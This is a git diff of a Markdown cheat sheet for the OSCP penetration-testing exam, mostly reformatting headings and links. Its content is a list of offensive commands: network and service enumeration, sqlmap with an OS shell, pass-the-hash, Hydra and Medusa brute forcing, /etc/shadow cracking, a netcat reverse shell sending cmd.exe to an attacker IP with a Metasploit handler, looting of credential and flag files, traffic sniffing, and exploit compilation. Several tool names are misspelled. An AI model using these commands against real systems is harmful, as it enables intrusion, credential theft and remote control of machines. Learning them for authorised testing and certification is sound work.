@@ -13,21 +13,21 @@ Here are some commands that I found helpful during the OSCP. I encourage you to 
 # Pre  
 ***
 
-Scanning
+#### Scanning  
 General pass - `nmap <IP> --top-ports 10 --open`  
 Intense scan - `nmap -p 1-65535 -T4 -A -v <IP>`  
 
-Web
+#### Web  
 `nitko -h <IP>`  
 `dirb http://<IP> /usr/share/wordlists/dirb/<insert related list>`  
 `finmap -u <IP>`  
 `./dotdotpwn.pl -m <MODULE> -h <HOST> [OPTIONS]`  
 `wpscan –url http://<IP>/ –enumerate p`  
-https://evilzone.org/tutorials/remote-file-inclusion%28rfi%29/  
-http://www.hackersonlineclub.com/lfi-rfi  
-https://0xzoidberg.wordpress.com/category/security/lfi-rfi/  
+[File Include Resource 1](https://evilzone.org/tutorials/remote-file-inclusion%28rfi%29/)  
+[File Include Resource 2](http://www.hackersonlineclub.com/lfi-rfi)  
+[File Include Resource 3(https://0xzoidberg.wordpress.com/category/security/lfi-rfi/)  
 
-SMB/RPC
+#### SMB/RPC  
 `enum4linux -a <IP>`  
 `nmap --script=smb* -p <PORT(S)> <IP>`  
 `rpcclient <IP> -U "" -N`  
@@ -39,26 +39,27 @@ SMB/RPC
 `rlogin <IP>`  
 `nmblookup -A target`  
 
-SQL
+#### SQL  
 `nmap -sV -Pn -vv –script=mysql* <IP> -p <PORT>`  
 `sqlmap -u <IP> –crawl=1`  
 `sqlmap -u http://<IP>/page.php?commen=761 –DBMS=mysql –os-shell`  
-http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet  
-http://resources.infosecinstitute.com/backdoor-sql-injection/  
+[SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
+[Backdoor SQL Injection](http://resources.infosecinstitute.com/backdoor-sql-injection/)  
 
-SMTP
+
+#### SMTP  
 `nmap –script=smtp* -p <PORT> <IP>`  
 
-SNMP
+#### SNMP  
 `snmpwalk -c public -v1 <IP>`  
 `snmpenum -t <IP>`  
 `Onesixtyone – c <COMMUNITY FILE> -I <IP>`  
 
-FTP
+#### FTP  
 `nmap –script=ftp* -p <PORT> <IP>`  
 `ftp://<IP>`  
 
-DNS
+#### DNS  
 `./dnsrecon.py -d <DOMAIN>`  
 `./dnsrecon.py -d <DOMAIN> -t axfr`  
 `./dnsrecon.py -d <DOMAIN> -D <NAME LIST> -t brt`  
@@ -66,40 +67,40 @@ DNS
 `nmap –script=dns-zone-transfer -p 53 ns2.megacorpone.com`  
 `nmap <IP> -p- -sV --reason --dns-server 1.2.3.4`  
 
-Pass-the-Hash
+#### Pass-the-Hash  
 `pth-winexe -U <HASH> //<IP> cmd`  
 
 # During  
 ***
 
-Password Cracking
+#### Password Cracking  
 Discover type of hash that you have
 `hash-identifier`  
 
-John the Ripper
-/etc/shadow cracking
+#### John the Ripper  
+##### /etc/shadow cracking  
  - Create a file with passwd
  - Create a file with shadow
  - Combine into one document
    `-unshadow <passwd file location> <shadow file location> > <new combined file>`  
 `john --wordlist=<any word list> <combined file location>`  
 
-Hydra
+#### Hydra  
 `Hydra -L <USER FILE> -P <PASS FILE> -v <IP> ssh`  
 
-Medusa
+#### Medusa  
 `Medusa -h <IP> -U <USER FILE> -P <PASS FILE> -M http -m DIR:/admin -T 30`  
 
-Hashcat
+#### Hashcat  
 `hashcat -m 400 -a 0 <HASH FILE> <WORD LIST>`  
 
-TTY Shells
+#### TTY Shells  
 See shells section
 
-Metaplsoit Payloads
+#### Metaplsoit Payloads  
 See msfvenom cheat sheet
 
-Metasploit commands
+#### Metasploit commands  
 `sysinfo`  
 `getuid`  
 `search -f *pass*.txt`  
@@ -107,26 +108,26 @@ Metasploit commands
 `getprivs`  
 `session -i 1` ---puts you back into your session
 
-Turn a regular shell into a meterpreter shell
-Attacker
+#### Turn a regular shell into a meterpreter shell  
+##### Attacker  
 `use exploit/multi/handler`  
 `set payload windows/shell/reverse_tcp`  
 `set lhost <IP>`  
 `set lport <PORT>`  
 `run`  
-Target
+##### Target  
 `nc -vn <IP> <PORT> -e cmd.exe`  
-Attacker
+##### Attacker  
 Ctrl+Z (to background session)
 `sessions -l` (this will list your sessions to verify which one it is)
 `setg rhost <IP>`  
 `setg lhost <IP>`  
 `sessions -u 1` (the 1 is the session number)
 
-Netcat
+#### Netcat  
 See netcat cheat sheet
 
-Useful Windows Commands
+#### Useful Windows Commands  
 `net view`  
 `net user`  
 `net localgroup Users`  
@@ -150,7 +151,7 @@ Useful Windows Commands
 `%WINDRIVE%\win.ini`  
 `type %WINDRIVE%\System32\drivers\etc\hosts`  
 
-Useful Nix Commands
+#### Useful Nix Commands  
 SUID root files`  
 `find / -user root -perm -4000 -print`  
 SGID root files:
@@ -165,7 +166,7 @@ Symlinks and their pointers
 find / -type l -ls`  
 
 
-Download an EXE from FTP server
+#### Download an EXE from FTP server  
 `echo open IP> C:\script.txt`  
 `echo user myftpuser>> C:\script.txt`  
 `echo pass myftppass>> C:\script.txt`  
@@ -173,16 +174,14 @@ Download an EXE from FTP server
 `echo bye>> C:\script.txt`  
 `ftp -s:script.txt`  
 
-Shells
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-http://roo7break.co.uk/?p=215
-http://www.r57shell.net/
-
+#### Shells  
+See resources section
+[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
 
 # Post  
 ***
 
-Windows looting (brief)
+#### Windows looting (brief)  
 `systeminfo `  
 `type boot.ini `  
 `hostname`  
@@ -201,7 +200,7 @@ Windows looting (brief)
 `dir network-secret.txt /s`  
 `windump -i 2 -w capture -n -U -s 0 src not <IP> and dst not <IP>`  
 
-Nix looting (brief)
+#### Nix looting (brief)  
 `locate proof.txt/network-secret.txt`  
 `find -name "proof.txt"/"network-secret.txt"`  
 `uname -a`  
@@ -217,7 +216,7 @@ Nix looting (brief)
 `tcpdump -i eth0 -w capture -n -U -s 0 src not <IP> and dst not <IP>`  
 `tcpdump -vv -i eth0 src not <IP> and dst not <IP>`  
 
-Packet Sniffing
+#### Packet Sniffing  
 `tcpdump -i tap0  host <IP> tcp port 80 and not arp and not icmp -vv`  
 `tcpdump -i eth0 -w capture -n -U -s 0 src not <ATTACKING IP> and dst not <ATTACKING IP>`  
 `tcpdump -vv -i eth0 src not <ATTACKING IP> and dst not <ATTACKING IP>`  
@@ -225,14 +224,14 @@ Packet Sniffing
 # Other  
 ***
 
-Quick Kali Configuration
+#### Quick Kali Configuration  
 SSH
 Start
 `service ssh start`  
 Stop
 `service ssh stop`  
 
-HTTP Service
+#### HTTP Service  
 Start
 `service apache2 start`  
 Verify its running
@@ -242,18 +241,18 @@ Directory
 Stop
 `service apache2 stop`  
 
-Update boot sequence
+#### Update boot sequence  
 `update-rc.d ssh enable`  
 `update-rc.d apache2 enable`  
 `rcconf (GUI)`  
 
-Compiling Exploits
+#### Compiling Exploits  
 32-bit
 `gcc -m32 -o output32 hello.c`  
 64-bit
 `gcc -o output hello.c`  
 
-Windows Compiling
+#### Windows Compiling  
 `cd /root/.wine/drive_c/MinGW/bin`  
 `wine gcc -o exploit.exe /tmp/exploit.c -lwsock32`  
 `wine exploit.exe`  
